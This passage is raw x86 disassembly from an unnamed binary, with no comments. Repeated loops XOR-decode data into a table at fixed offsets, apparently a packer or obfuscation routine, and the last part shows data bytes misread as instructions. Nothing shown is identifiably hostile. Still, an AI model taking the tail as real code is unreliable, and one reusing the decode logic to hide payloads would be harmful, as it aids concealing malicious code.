  40ff0c:	mov    DWORD PTR ds:0x448d10,ecx
  40ff12:	mov    edx,0xbe458686
  40ff17:	sub    edx,DWORD PTR ds:0x448d1c
  40ff1d:	xor    edx,ecx
  40ff1f:	mov    DWORD PTR [eax+0x10],edx
  40ff22:	mov    edx,DWORD PTR ds:0x4480b4
  40ff28:	movzx  ecx,BYTE PTR [edx+0xf]
  40ff2c:	movzx  edi,WORD PTR [edx+0xa]
  40ff30:	movzx  edx,BYTE PTR [edx+0x8]
  40ff34:	shl    ecx,0x10
  40ff37:	add    ecx,edi
  40ff39:	shl    ecx,0x8
  40ff3c:	add    ecx,edx
  40ff3e:	mov    edx,0xbe458686
  40ff43:	sub    edx,DWORD PTR ds:0x448d1c
  40ff49:	mov    DWORD PTR ds:0x448d10,ecx
  40ff4f:	xor    edx,ecx
  40ff51:	mov    DWORD PTR [eax+0x14],edx
  40ff54:	mov    edx,DWORD PTR ds:0x4480b4
  40ff5a:	add    edx,0x10
  40ff5d:	add    eax,0x18
  40ff60:	dec    esi
  40ff61:	mov    DWORD PTR ds:0x4480b4,edx
  40ff67:	jne    0x40fe20
  40ff6d:	movzx  ecx,BYTE PTR [edx+0x7]
  40ff71:	movzx  esi,BYTE PTR [edx+0x4]
  40ff75:	movzx  edx,WORD PTR [edx]
  40ff78:	shl    ecx,0x8
  40ff7b:	add    ecx,esi
  40ff7d:	shl    ecx,0x10
  40ff80:	add    ecx,edx
  40ff82:	mov    edx,0xbe458686
  40ff87:	sub    edx,DWORD PTR ds:0x448d1c
  40ff8d:	mov    DWORD PTR ds:0x448d10,ecx
  40ff93:	xor    edx,ecx
  40ff95:	mov    DWORD PTR [eax],edx
  40ff97:	mov    eax,ds:0x448d20
  40ff9c:	mov    edx,DWORD PTR ds:0x4480b8
  40ffa2:	add    eax,0xf5b4
  40ffa7:	mov    esi,0x49
  40ffac:	lea    esp,[esp+0x0]
  40ffb0:	movzx  ecx,BYTE PTR [edx+0x4]
  40ffb4:	movzx  edi,BYTE PTR [edx+0x2]
  40ffb8:	movzx  edx,WORD PTR [edx]
  40ffbb:	shl    ecx,0x8
  40ffbe:	add    ecx,edi
  40ffc0:	shl    ecx,0x10
  40ffc3:	add    ecx,edx
  40ffc5:	mov    edx,DWORD PTR ds:0x448d1c
  40ffcb:	xor    edx,ecx
  40ffcd:	mov    DWORD PTR ds:0x448d10,ecx
  40ffd3:	xor    edx,0x4b099ae9
  40ffd9:	mov    DWORD PTR [eax],edx
  40ffdb:	mov    ecx,DWORD PTR ds:0x4480b8
  40ffe1:	mov    ecx,DWORD PTR [ecx+0x5]
  40ffe4:	mov    DWORD PTR ds:0x448d10,ecx
  40ffea:	mov    edx,0x4b119cf5
  40ffef:	sub    edx,DWORD PTR ds:0x448d1c
  40fff5:	xor    edx,ecx
  40fff7:	mov    DWORD PTR [eax+0x4],edx
  40fffa:	mov    edx,DWORD PTR ds:0x4480b8
  410000:	add    edx,0x10
  410003:	mov    DWORD PTR ds:0x4480b8,edx
  410009:	movzx  ecx,BYTE PTR [edx+0x4]
  41000d:	movzx  edi,BYTE PTR [edx+0x2]
  410011:	movzx  edx,WORD PTR [edx]
  410014:	shl    ecx,0x8
  410017:	add    ecx,edi
  410019:	shl    ecx,0x10
  41001c:	add    ecx,edx
  41001e:	mov    edx,DWORD PTR ds:0x448d1c
  410024:	xor    edx,ecx
  410026:	mov    DWORD PTR ds:0x448d10,ecx
  41002c:	xor    edx,0x4b099ae9
  410032:	mov    DWORD PTR [eax+0x8],edx
  410035:	mov    ecx,DWORD PTR ds:0x4480b8
  41003b:	mov    ecx,DWORD PTR [ecx+0x5]
  41003e:	mov    DWORD PTR ds:0x448d10,ecx
  410044:	mov    edx,0x4b119cf5
  410049:	sub    edx,DWORD PTR ds:0x448d1c
  41004f:	xor    edx,ecx
  410051:	mov    DWORD PTR [eax+0xc],edx
  410054:	mov    edx,DWORD PTR ds:0x4480b8
  41005a:	add    edx,0x10
  41005d:	mov    DWORD PTR ds:0x4480b8,edx
  410063:	movzx  ecx,BYTE PTR [edx+0x4]
  410067:	movzx  edi,BYTE PTR [edx+0x2]
  41006b:	movzx  edx,WORD PTR [edx]
  41006e:	shl    ecx,0x8
  410071:	add    ecx,edi
  410073:	shl    ecx,0x10
  410076:	add    ecx,edx
  410078:	mov    edx,DWORD PTR ds:0x448d1c
  41007e:	xor    edx,ecx
  410080:	mov    DWORD PTR ds:0x448d10,ecx
  410086:	xor    edx,0x4b099ae9
  41008c:	mov    DWORD PTR [eax+0x10],edx
  41008f:	mov    ecx,DWORD PTR ds:0x4480b8
  410095:	mov    ecx,DWORD PTR [ecx+0x5]
  410098:	mov    DWORD PTR ds:0x448d10,ecx
  41009e:	mov    edx,0x4b119cf5
  4100a3:	sub    edx,DWORD PTR ds:0x448d1c
  4100a9:	xor    edx,ecx
  4100ab:	mov    DWORD PTR [eax+0x14],edx
  4100ae:	mov    edx,DWORD PTR ds:0x4480b8
  4100b4:	add    edx,0x10
  4100b7:	mov    DWORD PTR ds:0x4480b8,edx
  4100bd:	movzx  ecx,BYTE PTR [edx+0x4]
  4100c1:	movzx  edi,BYTE PTR [edx+0x2]
  4100c5:	movzx  edx,WORD PTR [edx]
  4100c8:	shl    ecx,0x8
  4100cb:	add    ecx,edi
  4100cd:	shl    ecx,0x10
  4100d0:	add    ecx,edx
  4100d2:	mov    edx,DWORD PTR ds:0x448d1c
  4100d8:	xor    edx,ecx
  4100da:	mov    DWORD PTR ds:0x448d10,ecx
  4100e0:	xor    edx,0x4b099ae9
  4100e6:	mov    DWORD PTR [eax+0x18],edx
  4100e9:	mov    ecx,DWORD PTR ds:0x4480b8
  4100ef:	mov    ecx,DWORD PTR [ecx+0x5]
  4100f2:	mov    DWORD PTR ds:0x448d10,ecx
  4100f8:	mov    edx,0x4b119cf5
  4100fd:	sub    edx,DWORD PTR ds:0x448d1c
  410103:	add    eax,0x20
  410106:	xor    edx,ecx
  410108:	mov    DWORD PTR [eax-0x4],edx
  41010b:	mov    edx,DWORD PTR ds:0x4480b8
  410111:	add    edx,0x10
  410114:	dec    esi
  410115:	mov    DWORD PTR ds:0x4480b8,edx
  41011b:	jne    0x40ffb0
  410121:	mov    eax,ds:0x448d20
  410126:	mov    edx,DWORD PTR ds:0x4480bc
  41012c:	add    eax,0xfed4
  410131:	mov    esi,0x32
  410136:	jmp    0x410140
  410138:	lea    esp,[esp+0x0]
  41013f:	nop
  410140:	movzx  ecx,BYTE PTR [edx+0x7]
  410144:	movzx  edi,BYTE PTR [edx+0x4]
  410148:	movzx  edx,WORD PTR [edx+0x2]
  41014c:	shl    ecx,0x8
  41014f:	add    ecx,edi
  410151:	shl    ecx,0x10
  410154:	add    ecx,edx
  410156:	mov    DWORD PTR ds:0x448d10,ecx
  41015c:	mov    edx,0xec14b444
  410161:	sub    edx,DWORD PTR ds:0x448d1c
  410167:	xor    edx,ecx
  410169:	mov    DWORD PTR [eax],edx
  41016b:	mov    edx,DWORD PTR ds:0x4480bc
  410171:	add    edx,0x8
  410174:	mov    DWORD PTR ds:0x4480bc,edx
  41017a:	movzx  ecx,BYTE PTR [edx+0x7]
  41017e:	movzx  edi,BYTE PTR [edx+0x4]
  410182:	movzx  edx,WORD PTR [edx+0x2]
  410186:	shl    ecx,0x8
  410189:	add    ecx,edi
  41018b:	shl    ecx,0x10
  41018e:	add    ecx,edx
  410190:	mov    DWORD PTR ds:0x448d10,ecx
  410196:	mov    edx,0xec14b444
  41019b:	sub    edx,DWORD PTR ds:0x448d1c
  4101a1:	xor    edx,ecx
  4101a3:	mov    DWORD PTR [eax+0x4],edx
  4101a6:	mov    edx,DWORD PTR ds:0x4480bc
  4101ac:	add    edx,0x8
  4101af:	mov    DWORD PTR ds:0x4480bc,edx
  4101b5:	movzx  ecx,BYTE PTR [edx+0x7]
  4101b9:	movzx  edi,BYTE PTR [edx+0x4]
  4101bd:	movzx  edx,WORD PTR [edx+0x2]
  4101c1:	shl    ecx,0x8
  4101c4:	add    ecx,edi
  4101c6:	shl    ecx,0x10
  4101c9:	add    ecx,edx
  4101cb:	mov    DWORD PTR ds:0x448d10,ecx
  4101d1:	mov    edx,0xec14b444
  4101d6:	sub    edx,DWORD PTR ds:0x448d1c
  4101dc:	xor    edx,ecx
  4101de:	mov    DWORD PTR [eax+0x8],edx
  4101e1:	mov    edx,DWORD PTR ds:0x4480bc
  4101e7:	add    edx,0x8
  4101ea:	mov    DWORD PTR ds:0x4480bc,edx
  4101f0:	movzx  ecx,BYTE PTR [edx+0x7]
  4101f4:	movzx  edi,BYTE PTR [edx+0x4]
  4101f8:	movzx  edx,WORD PTR [edx+0x2]
  4101fc:	shl    ecx,0x8
  4101ff:	add    ecx,edi
  410201:	shl    ecx,0x10
  410204:	add    ecx,edx
  410206:	mov    DWORD PTR ds:0x448d10,ecx
  41020c:	mov    edx,0xec14b444
  410211:	sub    edx,DWORD PTR ds:0x448d1c
  410217:	xor    edx,ecx
  410219:	mov    DWORD PTR [eax+0xc],edx
  41021c:	mov    edx,DWORD PTR ds:0x4480bc
  410222:	add    edx,0x8
  410225:	mov    DWORD PTR ds:0x4480bc,edx
  41022b:	movzx  ecx,BYTE PTR [edx+0x7]
  41022f:	movzx  edi,BYTE PTR [edx+0x4]
  410233:	movzx  edx,WORD PTR [edx+0x2]
  410237:	shl    ecx,0x8
  41023a:	add    ecx,edi
  41023c:	shl    ecx,0x10
  41023f:	add    ecx,edx
  410241:	mov    DWORD PTR ds:0x448d10,ecx
  410247:	mov    edx,0xec14b444
  41024c:	sub    edx,DWORD PTR ds:0x448d1c
  410252:	xor    edx,ecx
  410254:	mov    DWORD PTR [eax+0x10],edx
  410257:	mov    edx,DWORD PTR ds:0x4480bc
  41025d:	add    edx,0x8
  410260:	mov    DWORD PTR ds:0x4480bc,edx
  410266:	movzx  ecx,BYTE PTR [edx+0x7]
  41026a:	movzx  edi,BYTE PTR [edx+0x4]
  41026e:	movzx  edx,WORD PTR [edx+0x2]
  410272:	shl    ecx,0x8
  410275:	add    ecx,edi
  410277:	shl    ecx,0x10
  41027a:	add    ecx,edx
  41027c:	mov    edx,0xec14b444
  410281:	sub    edx,DWORD PTR ds:0x448d1c
  410287:	mov    DWORD PTR ds:0x448d10,ecx
  41028d:	xor    edx,ecx
  41028f:	mov    DWORD PTR [eax+0x14],edx
  410292:	mov    edx,DWORD PTR ds:0x4480bc
  410298:	add    edx,0x8
  41029b:	add    eax,0x18
  41029e:	dec    esi
  41029f:	mov    DWORD PTR ds:0x4480bc,edx
  4102a5:	jne    0x410140
  4102ab:	mov    eax,ds:0x448d20
  4102b0:	mov    edx,DWORD PTR ds:0x4480c0
  4102b6:	add    eax,0x10384
  4102bb:	mov    esi,0x5e
  4102c0:	movzx  ecx,BYTE PTR [edx+0x6]
  4102c4:	movzx  edi,WORD PTR [edx+0x3]
  4102c8:	movzx  edx,BYTE PTR [edx]
  4102cb:	shl    ecx,0x10
  4102ce:	add    ecx,edi
  4102d0:	shl    ecx,0x8
  4102d3:	add    ecx,edx
  4102d5:	mov    DWORD PTR ds:0x448d10,ecx
  4102db:	mov    edx,0xb9a02149
  4102e0:	sub    edx,DWORD PTR ds:0x448d1c
  4102e6:	xor    edx,ecx
  4102e8:	mov    DWORD PTR [eax],edx
  4102ea:	mov    edx,DWORD PTR ds:0x4480c0
  4102f0:	add    edx,0x8
  4102f3:	mov    DWORD PTR ds:0x4480c0,edx
  4102f9:	movzx  ecx,BYTE PTR [edx+0x6]
  4102fd:	movzx  edi,WORD PTR [edx+0x3]
  410301:	movzx  edx,BYTE PTR [edx]
  410304:	shl    ecx,0x10
  410307:	add    ecx,edi
  410309:	shl    ecx,0x8
  41030c:	add    ecx,edx
  41030e:	mov    DWORD PTR ds:0x448d10,ecx
  410314:	mov    edx,0xb9a02149
  410319:	sub    edx,DWORD PTR ds:0x448d1c
  41031f:	xor    edx,ecx
  410321:	mov    DWORD PTR [eax+0x4],edx
  410324:	mov    edx,DWORD PTR ds:0x4480c0
  41032a:	add    edx,0x8
  41032d:	mov    DWORD PTR ds:0x4480c0,edx
  410333:	movzx  ecx,BYTE PTR [edx+0x6]
  410337:	movzx  edi,WORD PTR [edx+0x3]
  41033b:	movzx  edx,BYTE PTR [edx]
  41033e:	shl    ecx,0x10
  410341:	add    ecx,edi
  410343:	shl    ecx,0x8
  410346:	add    ecx,edx
  410348:	mov    DWORD PTR ds:0x448d10,ecx
  41034e:	mov    edx,0xb9a02149
  410353:	sub    edx,DWORD PTR ds:0x448d1c
  410359:	xor    edx,ecx
  41035b:	mov    DWORD PTR [eax+0x8],edx
  41035e:	mov    edx,DWORD PTR ds:0x4480c0
  410364:	add    edx,0x8
  410367:	mov    DWORD PTR ds:0x4480c0,edx
  41036d:	movzx  ecx,BYTE PTR [edx+0x6]
  410371:	movzx  edi,WORD PTR [edx+0x3]
  410375:	movzx  edx,BYTE PTR [edx]
  410378:	shl    ecx,0x10
  41037b:	add    ecx,edi
  41037d:	shl    ecx,0x8
  410380:	add    ecx,edx
  410382:	mov    DWORD PTR ds:0x448d10,ecx
  410388:	mov    edx,0xb9a02149
  41038d:	sub    edx,DWORD PTR ds:0x448d1c
  410393:	xor    edx,ecx
  410395:	mov    DWORD PTR [eax+0xc],edx
  410398:	mov    edx,DWORD PTR ds:0x4480c0
  41039e:	add    edx,0x8
  4103a1:	mov    DWORD PTR ds:0x4480c0,edx
  4103a7:	movzx  ecx,BYTE PTR [edx+0x6]
  4103ab:	movzx  edi,WORD PTR [edx+0x3]
  4103af:	movzx  edx,BYTE PTR [edx]
  4103b2:	shl    ecx,0x10
  4103b5:	add    ecx,edi
  4103b7:	shl    ecx,0x8
  4103ba:	add    ecx,edx
  4103bc:	mov    DWORD PTR ds:0x448d10,ecx
  4103c2:	mov    edx,0xb9a02149
  4103c7:	sub    edx,DWORD PTR ds:0x448d1c
  4103cd:	xor    edx,ecx
  4103cf:	mov    DWORD PTR [eax+0x10],edx
  4103d2:	mov    edx,DWORD PTR ds:0x4480c0
  4103d8:	add    edx,0x8
  4103db:	mov    DWORD PTR ds:0x4480c0,edx
  4103e1:	movzx  ecx,BYTE PTR [edx+0x6]
  4103e5:	movzx  edi,WORD PTR [edx+0x3]
  4103e9:	movzx  edx,BYTE PTR [edx]
  4103ec:	shl    ecx,0x10
  4103ef:	add    ecx,edi
  4103f1:	shl    ecx,0x8
  4103f4:	add    ecx,edx
  4103f6:	mov    edx,0xb9a02149
  4103fb:	sub    edx,DWORD PTR ds:0x448d1c
  410401:	mov    DWORD PTR ds:0x448d10,ecx
  410407:	xor    edx,ecx
  410409:	mov    DWORD PTR [eax+0x14],edx
  41040c:	mov    edx,DWORD PTR ds:0x4480c0
  410412:	add    edx,0x8
  410415:	add    eax,0x18
  410418:	dec    esi
  410419:	mov    DWORD PTR ds:0x4480c0,edx
  41041f:	jne    0x4102c0
  410425:	mov    ecx,DWORD PTR ds:0x448d20
  41042b:	mov    edx,DWORD PTR ds:0x4480c4
  410431:	add    ecx,0x10c54
  410437:	mov    esi,0x4f
  41043c:	lea    esp,[esp+0x0]
  410440:	movzx  eax,BYTE PTR [edx+0x7]
  410444:	movzx  edi,BYTE PTR [edx+0x3]
  410448:	movzx  edx,WORD PTR [edx]
  41044b:	shl    eax,0x8
  41044e:	add    eax,edi
  410450:	shl    eax,0x10
  410453:	add    eax,edx
  410455:	mov    edx,DWORD PTR ds:0x448d1c
  41045b:	mov    ds:0x448d10,eax
  410460:	add    edx,0xbc0c8e32
  410466:	xor    edx,eax
  410468:	mov    DWORD PTR [ecx],edx
  41046a:	mov    edx,DWORD PTR ds:0x4480c4
  410470:	add    edx,0x8
  410473:	mov    DWORD PTR ds:0x4480c4,edx
  410479:	movzx  eax,BYTE PTR [edx+0x7]
  41047d:	movzx  edi,BYTE PTR [edx+0x3]
  410481:	movzx  edx,WORD PTR [edx]
  410484:	shl    eax,0x8
  410487:	add    eax,edi
  410489:	shl    eax,0x10
  41048c:	add    eax,edx
  41048e:	mov    edx,DWORD PTR ds:0x448d1c
  410494:	mov    ds:0x448d10,eax
  410499:	add    edx,0xbc0c8e32
  41049f:	xor    edx,eax
  4104a1:	mov    DWORD PTR [ecx+0x4],edx
  4104a4:	mov    edx,DWORD PTR ds:0x4480c4
  4104aa:	add    edx,0x8
  4104ad:	mov    DWORD PTR ds:0x4480c4,edx
  4104b3:	movzx  eax,BYTE PTR [edx+0x7]
  4104b7:	movzx  edi,BYTE PTR [edx+0x3]
  4104bb:	movzx  edx,WORD PTR [edx]
  4104be:	shl    eax,0x8
  4104c1:	add    eax,edi
  4104c3:	shl    eax,0x10
  4104c6:	add    eax,edx
  4104c8:	mov    edx,DWORD PTR ds:0x448d1c
  4104ce:	add    edx,0xbc0c8e32
  4104d4:	xor    edx,eax
  4104d6:	mov    ds:0x448d10,eax
  4104db:	mov    DWORD PTR [ecx+0x8],edx
  4104de:	mov    edx,DWORD PTR ds:0x4480c4
  4104e4:	add    edx,0x8
  4104e7:	mov    DWORD PTR ds:0x4480c4,edx
  4104ed:	movzx  eax,BYTE PTR [edx+0x7]
  4104f1:	movzx  edi,BYTE PTR [edx+0x3]
  4104f5:	movzx  edx,WORD PTR [edx]
  4104f8:	shl    eax,0x8
  4104fb:	add    eax,edi
  4104fd:	shl    eax,0x10
  410500:	add    eax,edx
  410502:	mov    edx,DWORD PTR ds:0x448d1c
  410508:	add    edx,0xbc0c8e32
  41050e:	xor    edx,eax
  410510:	mov    ds:0x448d10,eax
  410515:	mov    DWORD PTR [ecx+0xc],edx
  410518:	mov    edx,DWORD PTR ds:0x4480c4
  41051e:	add    edx,0x8
  410521:	mov    DWORD PTR ds:0x4480c4,edx
  410527:	movzx  eax,BYTE PTR [edx+0x7]
  41052b:	movzx  edi,BYTE PTR [edx+0x3]
  41052f:	movzx  edx,WORD PTR [edx]
  410532:	shl    eax,0x8
  410535:	add    eax,edi
  410537:	shl    eax,0x10
  41053a:	add    eax,edx
  41053c:	mov    edx,DWORD PTR ds:0x448d1c
  410542:	add    edx,0xbc0c8e32
  410548:	xor    edx,eax
  41054a:	mov    ds:0x448d10,eax
  41054f:	mov    DWORD PTR [ecx+0x10],edx
  410552:	mov    edx,DWORD PTR ds:0x4480c4
  410558:	add    edx,0x8
  41055b:	add    ecx,0x14
  41055e:	dec    esi
  41055f:	mov    DWORD PTR ds:0x4480c4,edx
  410565:	jne    0x410440
  41056b:	mov    esi,DWORD PTR ds:0x448d20
  410571:	mov    ebx,DWORD PTR ds:0x445028
  410577:	mov    ecx,DWORD PTR ds:0x4480c8
  41057d:	add    esi,0x11280
  410583:	mov    edi,0x100
  410588:	jmp    0x410590
  41058a:	lea    ebx,[ebx+0x0]
  410590:	movzx  eax,BYTE PTR [ecx+0x6]
  410594:	movzx  edx,BYTE PTR [ecx+0x3]
  410598:	movzx  ecx,WORD PTR [ecx]
  41059b:	shl    eax,0x8
  41059e:	add    eax,edx
  4105a0:	shl    eax,0x10
  4105a3:	add    eax,ecx
  4105a5:	mov    edx,0xa817de4
  4105aa:	sub    edx,DWORD PTR ds:0x448d1c
  4105b0:	mov    ds:0x448d10,eax
  4105b5:	xor    edx,eax
  4105b7:	lea    eax,[esp+0x14]
  4105bb:	push   eax
  4105bc:	mov    DWORD PTR [esi],edx
  4105be:	call   ebx
  4105c0:	mov    ecx,DWORD PTR ds:0x4480c8
  4105c6:	add    ecx,0x8
  4105c9:	add    esi,0x4
  4105cc:	dec    edi
  4105cd:	mov    DWORD PTR ds:0x4480c8,ecx
  4105d3:	jne    0x410590
  4105d5:	mov    esi,DWORD PTR ds:0x44502c
  4105db:	pop    edi
  4105dc:	pop    ebx
  4105dd:	test   ebp,ebp
  4105df:	je     0x4105e4
  4105e1:	push   ebp
  4105e2:	call   esi
  4105e4:	mov    eax,DWORD PTR [esp+0x8]
  4105e8:	test   eax,eax
  4105ea:	je     0x4105ef
  4105ec:	push   eax
  4105ed:	call   esi
  4105ef:	pop    esi
  4105f0:	pop    ebp
  4105f1:	add    esp,0x28
  4105f4:	ret    
  4105f5:	int3   
  4105f6:	int3   
  4105f7:	int3   
  4105f8:	int3   
  4105f9:	int3   
  4105fa:	int3   
  4105fb:	int3   
  4105fc:	int3   
  4105fd:	int3   
  4105fe:	int3   
  4105ff:	int3   
  410600:	out    0xe9,al
  410602:	mov    ebp,0x80000
  410607:	gs stc 
  410609:	inc    DWORD PTR [esi+0x3d]
  41060c:	inc    DWORD PTR [eax]
  41060e:	add    bh,bh
  410610:	ss xchg esi,eax
  410612:	into   
  410613:	inc    DWORD PTR [eax]
  410615:	cdq    
  410616:	sbb    esp,0x6e
  410619:	adc    DWORD PTR [esi+eax*1+0xff0000],0x1f
  410621:	imul   BYTE PTR [esi]
  410623:	(bad)  
  410624:	(bad)  
  410625:	jmp    0x410627
  410627:	mov    dl,0x5c
  410629:	sub    DWORD PTR [eax-0x47],0xffffffff
  41062d:	inc    DWORD PTR [eax]
  41062f:	add    BYTE PTR [esi],ch
  410631:	mov    ah,0x31
  410633:	inc    DWORD PTR [eax]
  410635:	cmp    eax,0x835fe6ff
  41063a:	xor    BYTE PTR [esi],ch
  41063c:	inc    DWORD PTR [eax]
  41063e:	add    BYTE PTR [eax],al
  410640:	fcomp  DWORD PTR [edx+0xd]
  410643:	cmp    edi,0x32
  410646:	add    bh,ah
  410648:	lods   eax,DWORD PTR ds:[esi]
  410649:	add    BYTE PTR [eax-0x69],al
  41064c:	cmp    edi,0xffffffff
  41064f:	mov    DWORD PTR [ebp-0x2f],eax
  410652:	std    
  410653:	int3   
  410654:	inc    DWORD PTR [edi-0x7c2d9b7d]
  41065a:	jmp    0x400707
  41065f:	jmp    FWORD PTR [eax-0x3b]
  410662:	inc    DWORD PTR [eax]
  410664:	call   DWORD PTR [ebp-0xc3e800]
  41066a:	inc    eax
  41066b:	pop    edi
  41066c:	(bad)  
  41066d:	(bad)  
  41066e:	inc    DWORD PTR [ebx-0xefe69c]
  410674:	dec    DWORD PTR [esi-0x1]
  410677:	mov    bl,BYTE PTR [ecx]
  410679:	call   FWORD PTR [eax-0xb]
  41067c:	cmp    edi,0xffffffff
  41067f:	int3   
  410680:	shr    BYTE PTR [ebp+0xfffff8f],cl
  410686:	adc    DWORD PTR [ecx-0x4d],0x0
  41068a:	adc    al,0x8
  41068c:	add    BYTE PTR [eax],al
  41068e:	mov    DWORD PTR [ebx-0x391e35],eax
  410694:	dec    DWORD PTR [edi+edi*8-0x180011b8]
  41069b:	bound  eax,QWORD PTR [eax]
  41069d:	inc    DWORD PTR [eax]
  41069f:	dec    DWORD PTR [eax+0x7a]
  4106a2:	xlat   BYTE PTR ds:[ebx]
  4106a3:	inc    DWORD PTR [eax]
  4106a5:	inc    esi
  4106a6:	and    DWORD PTR [edx-0x68],0x0
  4106aa:	sti    
  4106ab:	ds (bad) 
  4106ad:	inc    DWORD PTR [eax]
  4106af:	inc    DWORD PTR [eax]
  4106b1:	sahf   
  4106b2:	pop    ss
  4106b3:	add    BYTE PTR [eax],al
  4106b5:	mov    esi,0x6f9883
  4106ba:	fisttp DWORD PTR [ecx+0x0]
  4106bd:	add    BYTE PTR [eax],al
  4106bf:	(bad)  
  4106c0:	cli    
  4106c1:	scas   eax,DWORD PTR es:[edi]
  4106c2:	or     edi,edi
  4106c4:	mov    esi,ecx
  4106c6:	jmp    FWORD PTR [eax-0x39baffe9]
  4106cc:	add    bh,bh
  4106ce:	mov    DWORD PTR [eax],eax
  4106d0:	scas   al,BYTE PTR es:[edi]
  4106d1:	nop
  4106d2:	adc    edi,edi
  4106d4:	call   DWORD PTR [edi-0x58da01]
  4106da:	jb     0x410674
  4106dc:	add    DWORD PTR [ebx-0x31747c01],0x1a
  4106e3:	(bad)  
  4106e4:	jmp    DWORD PTR [eax+eax*1+0x21]
  4106e8:	sub    DWORD PTR [ebx+0x50b0],eax
  4106ee:	add    DWORD PTR [eax],0xd
  4106f1:	pop    eax
  4106f2:	iret   
  4106f3:	inc    DWORD PTR [eax]
  4106f5:	dec    ebx
  4106f6:	push   DWORD PTR [esi-0x4c]
  4106f9:	push   DWORD PTR [esi]
  4106fb:	test   BYTE PTR [eax],al
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	sub    DWORD PTR [ebp+0xff51de],0x58
  410706:	inc    DWORD PTR [edx+0x49]
  410709:	add    dl,ch
  41070b:	jne    0x41070c
  41070d:	inc    DWORD PTR [eax]
  41070f:	xor    DWORD PTR [ebx],0xffffffec
  410712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410713:	add    BYTE PTR [eax],al
  410715:	aam    0x89
  410717:	jb     0x4106b7
  410719:	jmp    DWORD PTR [edi-0x76ff7601]
  41071f:	adc    DWORD PTR [edx+0x65],0x6d
  410723:	add    bh,bh
  410725:	(bad)  
  410726:	int3   
  410727:	cld    
  410728:	(bad)  
  41072a:	cmp    DWORD PTR [edx+0xffff],eax
  410730:	pop    ebp
  410731:	or     cl,BYTE PTR [ebx-0x33710001]
  410737:	out    dx,al
  410738:	fdivp  st(7),st
  41073a:	xchg   BYTE PTR [edx],ah
  41073c:	(bad)  
  41073d:	inc    DWORD PTR [ebx+0x3aff0ff]
  410743:	mov    DWORD PTR [eax],eax
  410745:	lock sbb DWORD PTR [eax],0xffffffa7
  410749:	call   DWORD PTR ds:0xff830014
  41074f:	(bad)  
  410750:	mov    esi,0x83ff3a4f
  410755:	mov    al,0xff
  410757:	loope  0x41071e
  410759:	(bad)  
  41075a:	jns    0x4107cf
  41075c:	mov    edi,edi
  41075e:	(bad)  
  41075f:	jmp    FWORD PTR [eax-0xc646]
  410765:	and    al,BYTE PTR [eax]
  410767:	push   cs
  410768:	iret   
  410769:	add    dl,bh
  41076b:	push   ss
  41076c:	(bad)  
  41076d:	(bad)  
  41076e:	dec    DWORD PTR [ecx-0x1d557a]
  410774:	call   DWORD PTR ds:0xffd3c500
  41077a:	cmp    al,0x4f
  41077c:	add    BYTE PTR [ecx+0x174affff],cl
  410782:	sldt   WORD PTR [ebx+0xbc5ff0e]
  410789:	cmp    DWORD PTR [esi],0xffffff9e
  41078c:	inc    DWORD PTR [ebx+0x272b83ff]
  410792:	loopne 0x410793
  410794:	(bad)  
  410795:	in     al,dx
  410796:	add    BYTE PTR [eax+ebp*1-0x7d],ah
  41079a:	test   al,0xaa
  41079c:	int3   
  41079d:	inc    DWORD PTR [ebx+0x2ffa3483]
  4107a3:	add    BYTE PTR [eax],al
  4107a5:	inc    DWORD PTR [eax]
  4107a7:	and    bl,BYTE PTR [edx-0xf8dd7d]
  4107ad:	inc    DWORD PTR [eax]
  4107af:	dec    DWORD PTR [eax]
  4107b1:	fnstcw WORD PTR [edx+0x0]
  4107b4:	add    BYTE PTR [ebp-0x7c868101],cl
  4107ba:	ins    DWORD PTR es:[edi],dx
  4107bb:	dec    eax
  4107bc:	int3   
  4107bd:	(bad)  
  4107be:	(bad)  
  4107bf:	(bad)  
  4107c0:	fldenv [edi-0x200ffb5]
  4107c6:	add    BYTE PTR ds:0xba21ff61,bh
  4107cc:	add    BYTE PTR [ebx+0x62e7ccff],al
  4107d2:	imul   eax,DWORD PTR [eax],0x6d0069ff
  4107d8:	xor    BYTE PTR [eax],al
  4107da:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4107dc:	inc    DWORD PTR [eax]
  4107de:	inc    DWORD PTR [ebx-0x42f095]
  4107e4:	push   DWORD PTR [ebx+eax*4-0x5c]
  4107e8:	mov    esi,0xff278c00
  4107ed:	(bad)  
  4107ee:	(bad)  
  4107ef:	dec    DWORD PTR [ebp+0x42]
  4107f2:	mov    ds:0xff37ff83,eax
  4107f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107f8:	xrelease mov DWORD PTR [edi-0x337c00e7],esi
  4107ff:	mov    DWORD PTR [ecx],esp
  410801:	pop    ds
  410802:	jmp    0x410803
  410804:	(bad)  
  410805:	out    dx,eax
  410806:	call   FWORD PTR [eax-0x4b]
  410809:	inc    edi
  41080b:	push   ss
  41080c:	(bad)  
  41080d:	(bad)  
  41080e:	(bad)  
  41080f:	(bad)  
  410810:	mov    ebp,0x894680
  410815:	jb     0x41079a
  410817:	sbb    edi,0x592eff
  41081d:	add    bh,bh
  41081f:	(bad)  
  410820:	stc    
  410821:	std    
  410822:	pop    esi
  410823:	add    bh,bh
  410825:	sar    bh,0x49
  410828:	xchg   ebp,eax
  410829:	jmp    FWORD PTR [ebx-0xffffbe]
  41082f:	add    BYTE PTR [eax+0x1b],al
  410832:	(bad)  
  410833:	(bad)  
  410834:	push   esp
  410836:	add    DWORD PTR [ebp-0x4f9c7ccb],0x0
  41083d:	inc    DWORD PTR [ebx+0x48528b89]
  410843:	inc    DWORD PTR [eax]
  410845:	in     eax,0x0
  410847:	aam    0x80
  410849:	add    DWORD PTR ds:0xcc00ff9e,0xffffffcc
  410850:	mov    ebp,0xcc0058b9
  410855:	ins    BYTE PTR es:[edi],dx
  410856:	call   DWORD PTR [edx]
  410858:	push   esi
  410859:	jmp    ebp
  41085b:	pop    eax
  41085c:	inc    DWORD PTR [eax]
  41085e:	inc    DWORD PTR [eax]
  410860:	pop    ds
  410861:	sbb    eax,0xb383001f
  410866:	add    BYTE PTR [edi],bl
  410868:	scas   eax,DWORD PTR es:[edi]
  410869:	inc    esi
  41086b:	dec    ebp
  41086c:	add    ah,cl
  41086e:	cmp    edi,0x26
  410871:	mov    ebp,0xfdffcce6
  410876:	push   DWORD PTR [ebx+0x2d]
  410879:	sbb    DWORD PTR [ecx+eiz*1+0x0],0xffffffcc
  41087e:	add    ah,cl
  410880:	ret    0xfaaa
  410883:	or     esp,0xffffff87
